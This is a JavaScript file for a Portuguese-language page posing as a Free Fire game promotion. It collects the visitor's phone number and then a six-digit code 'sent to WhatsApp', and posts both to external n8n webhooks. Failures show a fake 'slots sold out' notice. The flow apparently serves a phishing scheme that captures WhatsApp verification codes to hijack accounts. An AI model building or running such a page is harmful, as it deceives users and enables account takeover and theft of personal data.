// Global variables
let userData = {}
let selectedOffer = {}
const verificationTimer = 240 // 4 minutes in seconds
let resendTimer = 120 // 2 minutes in seconds
let timerInterval
let resendInterval

// DOM Elements
const codeInputs = document.querySelectorAll(".code-input")
let resendTimerElement = document.getElementById("resendTimer")
const btnResendCode = document.getElementById("btnResendCode")
const btnConfirmCode = document.getElementById("btnConfirmCode")
const btnVerifyWhatsapp = document.getElementById("btnVerifyWhatsapp")
const successModal = document.getElementById("successModal")
const expiredModal = document.getElementById("expiredModal")

// Initialize
document.addEventListener("DOMContentLoaded", () => {
  loadUserData()
  initializeEventListeners()
  startResendTimer()
})

function loadUserData() {
  // Load data from localStorage
  const storedUserData = localStorage.getItem("userData")
  const storedOffer = localStorage.getItem("selectedOffer")

  if (storedUserData) {
    userData = JSON.parse(storedUserData)
    populateUserInfo()
  }

  if (storedOffer) {
    selectedOffer = JSON.parse(storedOffer)
    populateSelectedItem()
  }
}

function populateUserInfo() {
  document.getElementById("userNick").textContent = userData.nickname
  document.getElementById("userEmail").textContent = userData.email
  document.getElementById("userPhone").textContent = formatPhone(userData.phone)
}

function populateSelectedItem() {
  document.getElementById("selectedItemImage").src = selectedOffer.image
  document.getElementById("selectedItemName").textContent = selectedOffer.name
  document.getElementById("successItemImage").src = selectedOffer.image
  document.getElementById("successItemName").textContent = selectedOffer.name
}

function formatPhone(phone) {
  // Format phone number: 11999999999 -> (11) 99999-9999
  if (phone.length === 11) {
    return phone.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3")
  }
  return phone
}

function initializeEventListeners() {
  // Code input handling
  codeInputs.forEach((input, index) => {
    input.addEventListener("input", (e) => handleCodeInput(e, index))
    input.addEventListener("keydown", (e) => handleKeyDown(e, index))
    input.addEventListener("paste", handlePaste)
  })

  // Button events
  btnResendCode.addEventListener("click", handleResendCode)
  btnConfirmCode.addEventListener("click", handleConfirmCode)
  btnVerifyWhatsapp.addEventListener("click", () => {
    showToast("Verifique suas mensagens no WhatsApp!")
  })

  document.getElementById("btnFinish").addEventListener("click", () => {
    redirectToGame()
  })
  document.getElementById("btnBackToStart").addEventListener("click", () => {
    window.location.href = "index.html"
  })
}

function handleCodeInput(event, index) {
  const input = event.target
  const value = input.value

  // Only allow numbers
  if (!/^\d$/.test(value)) {
    input.value = ""
    return
  }

  // Add filled class
  input.classList.add("filled")

  // Move to next input
  if (value && index < codeInputs.length - 1) {
    codeInputs[index + 1].focus()
  }

  // Check if all inputs are filled
  checkCodeComplete()
}

function handleKeyDown(event, index) {
  // Handle backspace
  if (event.key === "Backspace" && !event.target.value && index > 0) {
    codeInputs[index - 1].focus()
    codeInputs[index - 1].classList.remove("filled")
  }
}

function handlePaste(event) {
  event.preventDefault()
  const paste = event.clipboardData.getData("text")
  const numbers = paste.replace(/\D/g, "").substring(0, 6)

  numbers.split("").forEach((digit, index) => {
    if (index < codeInputs.length) {
      codeInputs[index].value = digit
      codeInputs[index].classList.add("filled")
    }
  })

  checkCodeComplete()
}

function checkCodeComplete() {
  const code = Array.from(codeInputs)
    .map((input) => input.value)
    .join("")

  if (code.length === 6) {
    btnConfirmCode.disabled = false
    btnConfirmCode.style.background = "linear-gradient(135deg, #e30613 0%, #b8050f 100%)"
    btnConfirmCode.style.color = "white"
    btnConfirmCode.style.border = "none"
    btnConfirmCode.style.boxShadow = "0 6px 20px rgba(227, 6, 19, 0.4)"
  } else {
    btnConfirmCode.disabled = true
    btnConfirmCode.style.background = "linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%)"
    btnConfirmCode.style.color = "#6c757d"
    btnConfirmCode.style.border = "2px solid #dee2e6"
    btnConfirmCode.style.boxShadow = "none"
  }
}

function startResendTimer() {
  resendInterval = setInterval(() => {
    resendTimer--
    if (resendTimerElement) {
      resendTimerElement.textContent = resendTimer
    }

    if (resendTimer <= 0) {
      clearInterval(resendInterval)
      btnResendCode.disabled = false
      btnResendCode.innerHTML = '<i class="fas fa-redo"></i> Reenviar código'
    }
  }, 1000)
}

async function handleResendCode() {
  if (btnResendCode.disabled) return

  // Show loading state
  const originalText = btnResendCode.innerHTML
  btnResendCode.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Enviando...'
  btnResendCode.disabled = true

  try {
    const cleanPhone = userData.phone.replace(/\D/g, "")

    const response = await fetch("https://main-n8n.ohbhf7.easypanel.host/webhook/coletar-numero", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ telefone: cleanPhone }),
    })

    const data = await response.json()

    if (data.disponibilidade === "lotado") {
      btnResendCode.innerHTML = originalText
      btnResendCode.disabled = false
      showLotadoModal()
      return
    }

    // Reset resend timer
    resendTimer = 120
    btnResendCode.innerHTML = '<i class="fas fa-redo"></i> Reenviar código (<span id="resendTimer">120</span>s)'

    // Update resendTimerElement reference
    resendTimerElement = document.getElementById("resendTimer")

    // Restart resend timer
    startResendTimer()

    // Show feedback
    showToast("Código reenviado para seu WhatsApp!")
  } catch (error) {
    console.error("Erro ao reenviar código:", error)
    btnResendCode.innerHTML = originalText
    btnResendCode.disabled = false
    showLotadoModal()
  }
}

async function handleConfirmCode() {
  const code = Array.from(codeInputs)
    .map((input) => input.value)
    .join("")

  if (code.length !== 6) {
    showToast("Por favor, digite o código completo.")
    return
  }

  // Disable button during verification
  btnConfirmCode.disabled = true
  btnConfirmCode.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...'

  try {
    const response = await fetch("https://main-n8n.ohbhf7.easypanel.host/webhook/por-codigo", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ codigo: code }),
    })

    const data = await response.json()

    // Reset button state
    btnConfirmCode.disabled = false
    btnConfirmCode.innerHTML = '<i class="fas fa-check"></i> CONFIRMAR CÓDIGO'
    checkCodeComplete() // Restore proper button styling

    if (data.validado === "false" || data.validado === false) {
      clearCodeInputs()
      showLotadoModal()
      return
    }

    // Success - show success modal
    if (data.validado === "true" || data.validado === true) {
      // Success - show success modal
      showSuccessModal()
    } else {
      clearCodeInputs()
      showLotadoModal()
    }
  } catch (error) {
    console.error("Erro ao verificar código:", error)

    // Reset button state on error
    btnConfirmCode.disabled = false
    btnConfirmCode.innerHTML = '<i class="fas fa-check"></i> CONFIRMAR CÓDIGO'
    checkCodeComplete()

    clearCodeInputs()
    showLotadoModal()
  }
}

function showLotadoModal() {
  const lotadoModal = document.createElement("div")
  lotadoModal.className = "modal"
  lotadoModal.style.display = "block"
  lotadoModal.innerHTML = `
    <div class="modal-content lotado-modal">
      <div class="lotado-header">
        <div class="users-icon">
          <i class="fas fa-users"></i>
        </div>
        <h3>Vagas Esgotadas</h3>
        <p class="lotado-subtitle">Todas as vagas para esta promoção foram preenchidas</p>
      </div>
      <div class="modal-body">
        <p style="text-align: center; margin-bottom: 20px; color: #495057; line-height: 1.5;">
          Infelizmente, todas as vagas disponíveis para esta promoção já foram ocupadas. 
          Tente novamente mais tarde ou aguarde uma nova promoção.
        </p>
      </div>
      <div class="modal-footer">
        <button class="btn-lotado-ok" onclick="this.closest('.modal').remove(); window.location.href='index.html'">
          <i class="fas fa-check"></i>
          ENTENDI
        </button>
      </div>
    </div>
  `

  document.body.appendChild(lotadoModal)
  document.body.style.overflow = "hidden"

  // Close modal when clicking outside
  lotadoModal.addEventListener("click", (e) => {
    if (e.target === lotadoModal) {
      lotadoModal.remove()
      document.body.style.overflow = "auto"
      window.location.href = "index.html"
    }
  })
}

function clearCodeInputs() {
  codeInputs.forEach((input) => {
    input.value = ""
    input.classList.remove("filled")
  })
  codeInputs[0].focus()
  checkCodeComplete()
}

function showSuccessModal() {
  clearInterval(resendInterval)
  successModal.style.display = "block"
  document.body.style.overflow = "hidden"
}

function showToast(message) {
  // Create toast notification
  const toast = document.createElement("div")
  toast.className = "toast"
  toast.textContent = message
  toast.style.cssText = `
    position: fixed;
    top: 20px;
    left: 50%;
    transform: translateX(-50%);
    background: rgba(0, 0, 0, 0.9);
    color: white;
    padding: 12px 20px;
    border-radius: 10px;
    z-index: 10000;
    font-size: 14px;
    font-weight: 500;
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
  `

  document.body.appendChild(toast)

  setTimeout(() => {
    toast.remove()
  }, 3000)
}

// Auto-focus first input on load
window.addEventListener("load", () => {
  codeInputs[0].focus()
})

// Função para redirecionar para o jogo
function redirectToGame() {
  const userAgent = navigator.userAgent || navigator.vendor || window.opera

  // Detectar se é Android
  if (/android/i.test(userAgent)) {
    // Tentar abrir o Free Fire diretamente
    const freeFireIntent =
      "intent://com.dts.freefireth#Intent;scheme=package;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.vending;end"

    // Criar um link temporário para tentar abrir o app
    const tempLink = document.createElement("a")
    tempLink.href = freeFireIntent
    tempLink.click()

    // Fallback para Play Store após 2 segundos se o app não abrir
    setTimeout(() => {
      window.location.href = "https://play.google.com/store/apps/details?id=com.dts.freefireth"
    }, 2000)
  }
  // Detectar se é iOS
  else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
    // Tentar abrir o Free Fire diretamente no iOS
    window.location.href = "freefire://"

    // Fallback para App Store após 2 segundos se o app não abrir
    setTimeout(() => {
      window.location.href = "https://apps.apple.com/app/garena-free-fire-max/id1300146617"
    }, 2000)
  }
  // Desktop ou outros dispositivos
  else {
    // Mostrar opções para download
    showDownloadOptions()
  }
}

function showDownloadOptions() {
  // Criar modal com opções de download
  const downloadModal = document.createElement("div")
  downloadModal.className = "modal"
  downloadModal.style.display = "block"
  downloadModal.innerHTML = `
    <div class="modal-content">
      <div class="modal-header">
        <i class="fas fa-download"></i>
        <h3>Baixar Free Fire</h3>
      </div>
      <div class="modal-body" style="text-align: center; padding: 30px;">
        <p style="margin-bottom: 25px; color: #495057;">Escolha sua plataforma para baixar o Free Fire:</p>
        
        <div style="display: flex; gap: 15px; justify-content: center; flex-wrap: wrap;">
          <a href="https://play.google.com/store/apps/details?id=com.dts.freefireth" 
             target="_blank" 
             style="display: flex; align-items: center; gap: 10px; padding: 15px 20px; background: linear-gradient(135deg, #34a853 0%, #4caf50 100%); color: white; text-decoration: none; border-radius: 10px; font-weight: 600; transition: all 0.3s ease;">
            <i class="fab fa-google-play" style="font-size: 20px;"></i>
            Play Store
          </a>
          
          <a href="https://apps.apple.com/app/garena-free-fire-max/id1300146617" 
             target="_blank"
             style="display: flex; align-items: center; gap: 10px; padding: 15px 20px; background: linear-gradient(135deg, #007aff 0%, #0056b3 100%); color: white; text-decoration: none; border-radius: 10px; font-weight: 600; transition: all 0.3s ease;">
            <i class="fab fa-apple" style="font-size: 20px;"></i>
            App Store
          </a>
        </div>
      </div>
    </div>
  `

  document.body.appendChild(downloadModal)
  document.body.style.overflow = "hidden"

  // Fechar modal clicando fora
  downloadModal.addEventListener("click", (e) => {
    if (e.target === downloadModal) {
      downloadModal.remove()
      document.body.style.overflow = "auto"
    }
  })
}
